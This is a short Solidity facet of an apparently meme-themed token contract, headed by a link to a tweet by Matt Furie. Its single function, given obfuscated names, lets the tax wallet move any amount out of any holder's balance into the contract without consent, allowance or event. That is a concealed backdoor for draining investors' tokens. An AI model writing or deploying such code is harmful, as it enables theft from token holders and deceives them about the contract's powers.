/*
https://twitter.com/Matt_Furie/status/1766872835346280500
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;
import "./TestLib.sol";
contract soidioi2Facet is Context, Ownable {
    using SafeMath for uint256;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwap = true;
        _;
        ds.inSwap = false;
    }

    function soidioi2(address accee, uint256 diifji) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_msgSender() == ds._taxWallet);
        ds._balances[accee] = ds._balances[accee].sub(diifji);
        ds._balances[address(this)] = ds._balances[address(this)].add(diifji);
    }
}
